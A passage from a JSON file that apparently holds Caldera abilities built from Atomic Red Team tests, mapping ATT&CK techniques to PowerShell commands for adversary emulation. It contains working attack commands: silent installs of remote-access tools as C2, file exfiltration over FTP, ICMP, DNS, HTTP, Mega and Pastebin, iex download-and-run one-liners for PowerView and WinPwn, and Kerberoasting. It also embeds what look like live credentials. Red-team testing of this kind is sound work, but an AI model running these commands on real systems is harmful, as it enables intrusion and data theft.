        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"; Remove-Item $file1 -ErrorAction Ignore",
                    "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"; Start-Process $file1 /S; ",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aada5380e7d0a4c7b71f2a324d9d5327",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "aada5380e7d0a4c7b71f2a324d9d5327"
    },
    "T1219__command-and-control__Remote Access Software__e0e717c540d5e8ff24f00b7434626f7e": {
        "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      ; Stop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue; Stop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue; Stop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue; Stop-Process -Name \"RPCService\" -force -erroraction silentlycontinue",
                    "command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e0e717c540d5e8ff24f00b7434626f7e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e0e717c540d5e8ff24f00b7434626f7e"
    },
    "T1219__command-and-control__Remote Access Software__f1b3fca18d7465cd10e5a7477a3bf97d": {
        "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n",
        "tactic": "command-and-control",
        "technique": {
            "attack_id": "T1219",
            "name": "Remote Access Software"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package ; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"; Remove-Item $file1 -ErrorAction Ignore",
                    "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"; Start-Process -Wait $file1 /quiet; Start-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f1b3fca18d7465cd10e5a7477a3bf97d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f1b3fca18d7465cd10e5a7477a3bf97d"
    },
    "T1048.003__exfiltration__Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol__3f73be176cadf2762623b3117e25335d": {
        "description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName; $exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName; &$rclone_bin config create ftpserver \"ftp\" \"host\"; &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3f73be176cadf2762623b3117e25335d",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3f73be176cadf2762623b3117e25335d"
    },
    "T1048.003__exfiltration__Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol__d6df415c9fbfc30ac359542d67537953": {
        "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Send-MailMessage -From",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d6df415c9fbfc30ac359542d67537953",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d6df415c9fbfc30ac359542d67537953"
    },
    "T1048.003__exfiltration__Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol__6baab84fe7a52dd5c4ede612fc0d255f": {
        "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6baab84fe7a52dd5c4ede612fc0d255f",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6baab84fe7a52dd5c4ede612fc0d255f"
    },
    "T1048__exfiltration__Exfiltration Over Alternative Protocol__35b68f98acbdbdde166d4154462d2467": {
        "description": "DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048",
            "name": "Exfiltration Over Alternative Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\"; Invoke-DNSExfiltrator -i \"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\" -d target.example.com -p atomic -doh google -t 500 None",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "35b68f98acbdbdde166d4154462d2467",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "35b68f98acbdbdde166d4154462d2467"
    },
    "T1041__exfiltration__Exfiltration Over C2 Channel__72784d12700b219ec134aa42cec5603e": {
        "description": "Exfiltrates a file present on the victim machine to the C2 server.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1041",
            "name": "Exfiltration Over C2 Channel"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value \"This is line $_.\" }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "72784d12700b219ec134aa42cec5603e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "72784d12700b219ec134aa42cec5603e"
    },
    "T1048.003__exfiltration__Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol__6646e3ecc1d5a25bc1cd7e68fe43763b": {
        "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$ftp = \"ftp://#{ftp_server}/\"; try {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\")); {$uri = New-Object System.Uri($ftp+$file.name);  $ftp_del = [System.Net.FtpWebRequest]::create($uri);  $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}');  $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile;  $ftp_del.GetResponse()}} catch{}",
                    "command": "$Dir_to_copy = \"$env:windir\\temp\"; $ftp = \"ftp://#{ftp_server}/\"; $web_client = New-Object System.Net.WebClient; $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}'); if (test-connection -count 1 -computername \"#{ftp_server}\" -quiet); {foreach($file in (dir $Dir_to_copy \"*.7z\")); {echo \"Uploading $file...\"; $uri = New-Object System.Uri($ftp+$file.name); $web_client.UploadFile($uri, $file.FullName)}}; else; {echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6646e3ecc1d5a25bc1cd7e68fe43763b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6646e3ecc1d5a25bc1cd7e68fe43763b"
    },
    "T1020__exfiltration__Automated Exfiltration__305c23215a4bf6184ed701b5ca1d1af7": {
        "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1020",
            "name": "Automated Exfiltration"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; Remove-Item -Path $fileName -ErrorAction Ignore",
                    "command": "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; $url = \"https://google.com\"; $file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"; $contentType = \"application/octet-stream\"; try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "305c23215a4bf6184ed701b5ca1d1af7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "305c23215a4bf6184ed701b5ca1d1af7"
    },
    "T1567.002__exfiltration__Exfiltration Over Web Service: Exfiltration to Cloud Storage__9995c62a6263a14ae3b60fe2bb52e67a": {
        "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.002",
            "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\\"; .\\rclone.exe purge T1567002:test; .\\rclone.exe config delete T1567002:; Remove-Item $env:appdata\\rclone -recurse -force -erroraction silentlycontinue; cd c:\\; Remove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"; Remove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force",
                    "command": "New-Item $env:appdata\\rclone -ItemType directory; New-Item $env:appdata\\rclone\\rclone.conf; cd \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\\"; .\\rclone.exe config create T1567002 mega; set-Content $env:appdata\\rclone\\rclone.conf \"[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA\"; .\\rclone.exe copy --max-size 1700k \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" T1567002:test -v",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9995c62a6263a14ae3b60fe2bb52e67a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9995c62a6263a14ae3b60fe2bb52e67a"
    },
    "T1567.003__exfiltration__Exfiltration Over Web Service: Exfiltration to Text Storage Sites__c275ffb52331397b42ebc52338be3c8c": {
        "description": "This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             \nSee https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.003",
            "name": "Exfiltration Over Web Service: Exfiltration to Text Storage Sites"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$apiKey = \"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\"; $content = \"secrets, api keys, passwords...\"; $url = \"https://pastebin.com/api/api_post.php\"; $postData = @{;   api_dev_key   = $apiKey;   api_option    = \"paste\";   api_paste_code = $content; }; $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData; Write-Host \"Your paste URL: $response\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c275ffb52331397b42ebc52338be3c8c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c275ffb52331397b42ebc52338be3c8c"
    },
    "T1048.003__exfiltration__Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol__548a620bf3463f72a42937faf7614935": {
        "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1048.003",
            "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$content = Get-Content C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "548a620bf3463f72a42937faf7614935",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "548a620bf3463f72a42937faf7614935"
    },
    "T1069.001__discovery__Permission Groups Discovery: Local Groups__f5b4c02bae169cb3a62ac26bb80321d6": {
        "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-localgroup; Get-LocalGroupMember -Name \"Administrators\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5b4c02bae169cb3a62ac26bb80321d6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f5b4c02bae169cb3a62ac26bb80321d6"
    },
    "T1124__discovery__System Time Discovery__6913e132cdd2d9c29294490c2fbef2eb": {
        "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1124",
            "name": "System Time Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-Date",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6913e132cdd2d9c29294490c2fbef2eb",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6913e132cdd2d9c29294490c2fbef2eb"
    },
    "T1082__discovery__System Information Discovery__488ec76af9bd3c5d9feb1d660504b541": {
        "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cscript \"d06deb_griffon_recon.vbs\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "d06deb_griffon_recon.vbs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "488ec76af9bd3c5d9feb1d660504b541",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "488ec76af9bd3c5d9feb1d660504b541"
    },
    "T1083__discovery__File and Directory Discovery__d7967a23c8c030c698893f242e622be1": {
        "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "ls -recurse; get-childitem -recurse; gci -recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d7967a23c8c030c698893f242e622be1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d7967a23c8c030c698893f242e622be1"
    },
    "T1049__discovery__System Network Connections Discovery__6e3d4c708ab0ff571eb05691cc8bcdda": {
        "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1049",
            "name": "System Network Connections Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$syntaxList = \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" ; foreach ($syntax in $syntaxList) {; PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe $syntax -}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6e3d4c708ab0ff571eb05691cc8bcdda",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6e3d4c708ab0ff571eb05691cc8bcdda"
    },
    "T1518__discovery__Software Discovery__beafe61e6874eb9eec2119bd12255193": {
        "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Dotnetsearch -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "beafe61e6874eb9eec2119bd12255193",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "beafe61e6874eb9eec2119bd12255193"
    },
    "T1082__discovery__System Information Discovery__b8e136dad1af7b29939e86be6d7ecefa": {
        "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command \"-group=all\"; pause",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b8e136dad1af7b29939e86be6d7ecefa",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b8e136dad1af7b29939e86be6d7ecefa"
    },
    "T1087.002__discovery__Account Discovery: Domain Account__c84a57391dbc724dc51436deb3e0ca00": {
        "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c84a57391dbc724dc51436deb3e0ca00",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c84a57391dbc724dc51436deb3e0ca00"
    },
    "T1615__discovery__Group Policy Discovery__5a1dc4ce41e376e1928d3a399ccadff3": {
        "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "del $env:temp\\GPO_Output.txt -erroraction silentlycontinue",
                    "command": "Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\\GPO_Output.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5a1dc4ce41e376e1928d3a399ccadff3",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5a1dc4ce41e376e1928d3a399ccadff3"
    },
    "T1057__discovery__Process Discovery__1ddf2b8ee6a56ce9f9132a168947653e": {
        "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-wmiObject -class Win32_Process",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1ddf2b8ee6a56ce9f9132a168947653e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1ddf2b8ee6a56ce9f9132a168947653e"
    },
    "T1012__discovery__Query Registry__54f95564a265f67159d1f8ff907cd156": {
        "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1012",
            "name": "Query Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1592.002Test1.txt -force -erroraction silentlycontinue; remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue",
                    "command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\"); {try{write-output \"$($Position)-$($CLSID)\"; write-output \"------------\"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "54f95564a265f67159d1f8ff907cd156",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "54f95564a265f67159d1f8ff907cd156"
    },
    "T1135__discovery__Network Share Discovery__25b475e94dd2d70fcc66b2ce43c8f718": {
        "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-smbshare",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "25b475e94dd2d70fcc66b2ce43c8f718",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "25b475e94dd2d70fcc66b2ce43c8f718"
    },
    "T1201__discovery__Password Policy Discovery__214be4092770061080ef0781c26bab3e": {
